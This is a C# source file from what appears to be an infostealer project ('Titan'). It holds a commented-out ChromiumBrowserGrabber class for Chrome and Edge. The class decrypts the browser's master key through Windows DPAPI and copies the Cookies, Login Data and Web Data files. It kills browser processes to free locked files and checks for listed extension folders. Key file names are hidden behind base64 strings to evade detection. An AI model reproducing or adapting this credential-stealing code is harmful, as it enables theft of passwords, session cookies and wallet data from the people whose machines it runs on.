using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using Titan.NF.Client.Browsers;
using System.Security.Cryptography;
using Titan.NF.Client.Browsers.Contracts;
using System.Xml.Linq;
using System.Reflection;

namespace Titan.NF.Client.Browsers.Grabbers
{
	//[SupportedOSPlatform("windows")]
	//internal class ChromiumBrowserGrabber : IBrowserGrabber
	//{
	//	private List<string> DetectedPaths = new List<string>();
	//	private Dictionary<string, string> ImportantExtensions = new Dictionary<string, string>();
	//	string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
	//	string[] names = { "Chrome", "Edge"/*, "YandexBrowser"*/ };
    //
    //    Dictionary<string, string> nameMappings = new Dictionary<string, string>
	//	{
	//	    { "Chrome", "Google Chrome" },
	//	    { "Edge", "Microsoft Edge" },
	//	    //{ "Yandex", "Yandex Browser" }
	//	};
    //
	//	public List<string> DecodedIgnoreable()
	//	{
	//		List<string> Decoded = new List<string>();
	//		foreach(var decode in BrowsersRegistry.IgnoreableBase64)
	//		{
	//			Decoded.Add(decode.FromBase64());
	//		}
	//		return Decoded;
	//	}
    //
	//	public List<string> DecodedSearchable() 
	//	{
	//		List<string> Decoded = new List<string>();
	//		foreach(var decode in BrowsersRegistry.SearcheableBase64)
	//		{
	//			Decoded.Add(decode.FromBase64());
	//		}
	//		return Decoded;
	//	}
    //
    //
    //    public List<string> Detected()
	//	{
	//		List<string> IgnoredFolders = DecodedIgnoreable();
	//		List<string> SearchableFolders = DecodedSearchable();
	//		List<string> detectedPaths = new List<string>();
	//		string localState = "TG9jYWwgU3RhdGU=".FromBase64();
    //
    //        foreach (string name in SearchableFolders)
	//		{
	//			string filePath = RecursiveSearch(appData, name, localState, IgnoredFolders);
    //
	//			if (!string.IsNullOrEmpty(filePath))
	//			{
	//				detectedPaths.Add(filePath);
	//			}
	//		}
	//		return detectedPaths;
	//	}
    //
    //
	//	public List<string> MasterKeyContent()
	//	{
	//		List<string> resultFiles = new List<string>();
	//		List<string> detectedPaths = Detected();
    //
	//		foreach (string pathToKey in detectedPaths)
	//		{
	//			if (File.Exists(pathToKey))
	//			{
	//				try
	//				{
	//					resultFiles.Add(File.ReadAllText(pathToKey));
	//				}
	//				catch
	//				{
	//					Process.GetProcesses().Where(x => x.ProcessName.Contains(ProcessName())).ToList().ForEach(x => x.Kill());
    //
	//					string tempPath = Path.Combine(appData, pathToKey + "_tmp");
	//					File.Copy(pathToKey, tempPath);
	//					string data = File.ReadAllText(tempPath);
	//					File.Delete(tempPath);
    //
	//					resultFiles.Add(data);
	//				}
	//			}
	//		}
    //
	//		if (resultFiles.Count > 0)
	//		{
	//			return resultFiles;
	//		}
    //
	//		return null;
	//	}
    //
	//	public Dictionary<string, byte[]> MasterKey()
	//	{
	//		List<string> result = new List<string>();
    //        Dictionary<string, byte[]> decryptedKeys = new Dictionary<string, byte[]>();
    //        List<string> detectedPaths = Detected();
    //        List<string> SearchableFolders = DecodedSearchable();
    //
    //        foreach (string pathToKey in detectedPaths)
	//		{
	//			foreach (var name in SearchableFolders)
	//			{
	//				if (pathToKey.Contains(name))
	//				{
	//					Console.WriteLine(pathToKey);
	//					result.Add(File.ReadAllText(pathToKey));
    //                    foreach (string content in result)
    //                    {
    //                        if (content == null)
    //                        {
    //                            continue;
    //                        }
    //
    //                        dynamic json = JsonConvert.DeserializeObject(content);
    //
    //                        if (json == null)
    //                        {
    //                            continue;
    //                        }
    //
    //                        string key = json.os_crypt.encrypted_key;
    //                        byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
    //                        byte[] decryptedKey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);
    //                        decryptedKeys[name] = decryptedKey;
    //                    }
    //                }
	//			}
	//		}
    //        return decryptedKeys;
    //    }
    //
    //    private string RecursiveSearch(string directory, string targetFolder, string targetFile, List<string> ignoredFolders)
    //    {
    //        try
    //        {
    //            string folderName = Path.GetFileName(directory);
    //            if (string.Equals(folderName, targetFolder, StringComparison.OrdinalIgnoreCase))
    //            {
    //                string[] files = Directory.GetFiles(directory, targetFile, SearchOption.AllDirectories);
    //                if (files.Length > 0)
    //                {
    //                    return files[0];
    //                }
    //            }
    //
    //            string[] subdirectories = Directory.GetDirectories(directory);
    //            foreach (string subdirectory in subdirectories)
    //            {
    //                string subdirectoryName = Path.GetFileName(subdirectory);
    //                if (!ignoredFolders.Contains(subdirectoryName))
    //                {
    //                    string filePath = RecursiveSearch(subdirectory, targetFolder, targetFile, ignoredFolders);
    //
    //                    if (filePath != null)
    //                    {
    //                        return filePath;
    //                    }
    //                }
    //                else
    //                {
    //                    string[] subFiles = Directory.GetFiles(subdirectory, targetFile);
    //                    if (subFiles.Length > 0)
    //                    {
    //                        return subFiles[0];
    //                    }
    //                }
    //            }
    //        }
    //        catch
    //        {
    //        }
    //
    //        return null;
    //    }
    //
    //
    //    public Dictionary<string, byte[]> Cookie()
    //    {
	//		string cookies = "Q29va2llcw==".FromBase64();
    //        List<string> IgnoredFolders = DecodedIgnoreable();
    //        List<string> SearchableFolders = DecodedSearchable();
    //
	//		Dictionary<string, byte[]> cookiePathBytes = new Dictionary<string, byte[]>();
    //
	//		foreach (var name in nameMappings)
    //        {
    //            string cookiesPath = RecursiveSearch(appData, name.Key, cookies, IgnoredFolders);
	//			if (cookiesPath.Contains(name.Key))
	//			{
	//				Console.WriteLine(name.Key);
	//				try
	//				{
	//					byte[] cookieBytes = File.ReadAllBytes(cookiesPath);
	//					cookiePathBytes[name.Key] = cookieBytes;
	//				}
	//				catch
	//				{
    //
	//				}
	//			}
    //        }
    //        return cookiePathBytes;
    //    }
    //
    //    public Dictionary<string, byte[]> LoginDatas()
	//	{
    //        List<string> IgnoredFolders = DecodedIgnoreable();
    //        string loginData = "TG9naW4gRGF0YQ==".FromBase64();
    //
    //        Dictionary<string, byte[]> loginDataPathBytes = new Dictionary<string, byte[]>();
    //        foreach (var name in nameMappings)
    //        {
    //            string dataPath = RecursiveSearch(appData, name.Key, loginData, IgnoredFolders);
    //            if (dataPath.Contains(name.Key))
    //            {
    //                try
    //                {
    //                    byte[] cookieBytes = File.ReadAllBytes(dataPath);
    //                    loginDataPathBytes[name.Key] = cookieBytes;
    //                }
    //                catch
    //                {
	//					continue;
    //                }
    //            }
    //        }
    //        return loginDataPathBytes;
    //    }
    //
    //    public Dictionary<string, byte[]> WebData()
	//	{
    //        List<string> IgnoredFolders = DecodedIgnoreable();
    //
    //        string webData = "V2ViIERhdGE=".FromBase64();
    //        Dictionary<string, byte[]> webDataPathBytes = new Dictionary<string, byte[]>();
    //        foreach (var name in nameMappings)
    //        {
    //            string dataPath = RecursiveSearch(appData, name.Key, webData, IgnoredFolders);
    //            if (dataPath.Contains(name.Key))
    //            {
    //                try
    //                {
    //                    byte[] webDataBytes = File.ReadAllBytes(dataPath);
    //                    webDataPathBytes[name.Key] = webDataBytes;
    //                }
    //                catch
    //                {
    //
    //                }
    //            }
    //        }
    //        return webDataPathBytes;
	//	}
    //
    //    public Dictionary<string, string> Extensions()
    //    {
    //        ImportantExtensions.Clear();
    //        List<string> SearchableFolders = DecodedSearchable();
    //
    //        string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    //        foreach (string browser in SearchableFolders)
    //        {
    //            string browserPath = Path.Combine(appData, "Yandex");
    //            if (Directory.Exists(browserPath))
    //            {
    //                string localExtensionsPath = FindLocalExtensionsSetting(browserPath);
    //
    //                if (!string.IsNullOrEmpty(localExtensionsPath))
    //                {
    //                    foreach (var requiredExtension in BrowsersRegistry.ExtensionsMap)
    //                    {
    //                        string currentExtensionDirectory = Path.Combine(localExtensionsPath, requiredExtension.Value);
    //
    //                        if (Directory.Exists(currentExtensionDirectory))
    //                        {
    //                            string[] files = Directory.GetFiles(currentExtensionDirectory);
    //                            foreach (string file in files)
    //                            {
    //                                string fileName = Path.GetFileName(file);
    //                                ImportantExtensions.Add(requiredExtension.Key.FromBase64(), fileName);
    //                            }
    //                        }
    //                    }
    //                }
    //            }
    //        }
    //        return ImportantExtensions;
    //    }
    //
    //    private string FindLocalExtensionsSetting(string directory)
    //    {
    //        string[] directories = Directory.GetDirectories(directory, "Local Extensions Setting", SearchOption.AllDirectories);
    //
    //        return directories.FirstOrDefault();
    //    }
    //
    //
    //    public string ProcessName()
	//	{
	//		return "chrome";
	//	}
	//}
}
